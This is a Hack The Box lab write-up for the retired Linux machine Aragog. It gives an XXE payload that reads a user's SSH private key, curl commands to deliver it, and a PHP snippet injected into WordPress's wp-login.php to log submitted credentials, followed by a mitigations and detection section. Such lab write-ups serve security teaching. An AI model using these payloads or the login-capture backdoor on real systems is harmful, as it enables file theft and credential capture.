---
machine: Aragog
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, ftp, xxe, wordpress, privesc]
---

# Aragog — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

FTP allows anonymous login and hands out a sample XML file that reveals the format accepted by `hosts.php`. The page is vulnerable to in-band XXE: it reads `/etc/passwd` and `florian`'s private SSH key. As `florian`, an internal WordPress site is restored every five minutes from a root-owned backup; `pspy` shows a script that logs into WordPress, and by modifying `wp-login.php` its credentials are captured. The same password also works for `root`.

## Recon

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21` vsftpd 3.0.3 with anonymous login.
- `22` OpenSSH 7.2p2 on Ubuntu 16.04.
- `80` Apache 2.4.18; the root serves the default page.

The box was reworked: the main site now redirects to `aragog.htb`, so the name must be added to `/etc/hosts` and used in web requests.

## Enumeration

```bash
ftp <IP>
# username: anonymous
ls
get test.txt
```

`test.txt` contains a subnet mask in XML:

```xml
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

`gobuster` finds `hosts.php`. Sending the XML with `curl` makes the page calculate the host count and reflect the content:

```bash
curl -X POST --data-binary @test.txt http://aragog.htb/hosts.php
```

## Foothold

The `subnet_mask` field is parsed as XML without disabling external entities. Define a `SYSTEM` entity pointing at a local file and place it inside the node:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa">
]>
<details>
  <subnet_mask>&xxe;</subnet_mask>
  <test></test>
</details>
```

```bash
curl -s -X POST --data-binary @exploit.xml http://aragog.htb/hosts.php
```

The response contains `florian`'s private key. Save it with `600` permissions and use it over SSH:

```bash
chmod 600 id_rsa_florian
ssh -i id_rsa_florian florian@aragog.htb
```

The same technique reads `/etc/passwd` and confirms the `florian` and `cliff` accounts.

## Lateral movement

No pivot is needed: `florian` is already on the host. `/var/www/html` contains `dev_wiki`, a WordPress installation, next to `zz_backup` and `hosts.php`.

## Privilege escalation

`pspy` reveals two scheduled tasks:

- every minute, `cliff` runs `/home/cliff/wp-login.py`;
- every five minutes, root runs `/root/restore.sh`, which removes `dev_wiki`, copies it from `zz_backup` and makes it writable.

`cliff`'s script logs into WordPress. Since `wp-login.php` is writable, add code that saves the submitted parameters:

```php
<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/df", "a");
fwrite($fff, $rrr);
fclose($fff);
```

After the cron runs, `/dev/shm/df` contains the WordPress administrator's username and password. That password also works for `root`:

```bash
su
# enter the captured password
id
```

## Evidence

- `test.txt` retrieved over anonymous FTP.
- `hosts.php` response containing `/etc/lsb-release` and `florian`'s key.
- `pspy` output showing `restore.sh` and `wp-login.py`.
- `/dev/shm/df` with the captured login request.
- `id` as root.

## Lessons learned

- A sample file on a read-only service can describe the format expected by a vulnerable application.
- In-band XXE is enough when the response reflects the entity; an out-of-band channel is not always required.
- Automatic backups and login scripts are a source of credentials and root-controlled writes.
- `pspy` exposes cron and short-lived processes without access to `crontab`.

## Mitigations and detection

- Disable external entities and DTDs in the XML parser (avoid `LIBXML_NOENT`, set `resolve_entities=false`).
- Validate the mask as an IPv4 address and do not reflect the input unescaped.
- Do not store credentials in scripts or reuse the WordPress password for root.
- Restore backups from a read-only copy and do not make the whole web tree writable.
- Alert on `hosts.php` requests containing `<!DOCTYPE`, `SYSTEM` or `file://`, and on cron processes reading or writing `/dev/shm`.

## References

- [0xdf — Aragog](https://0xdf.gitlab.io/2018/07/21/htb-aragog.html)
- [IppSec — Aragog](https://www.youtube.com/watch?v=NFdi-2tgvxY)
- [Hack The Box — Aragog](https://app.hackthebox.com/machines/aragog)
